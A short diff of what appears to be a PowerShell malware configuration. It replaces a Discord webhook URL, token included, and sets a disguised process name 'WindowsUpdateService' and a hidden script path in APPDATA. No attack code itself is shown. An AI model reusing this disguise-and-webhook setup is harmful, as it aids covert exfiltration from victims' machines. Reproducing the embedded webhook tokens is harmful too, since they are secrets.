@@ -1,5 +1,5 @@
 # Configuration
-$WebhookUrl = "https://discord.com/api/webhooks/1348482615879139408/8WWmsASLCd2mVWVyInAUh0I_RprgBGRdWG1cDLWLptSvFtHwyJMetbIHQ_VfPdayeu_0"
+$WebhookUrl = "https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX"
 $ProcName = "WindowsUpdateService"
 $FilePath = "$env:APPDATA\win_update.ps1"
 
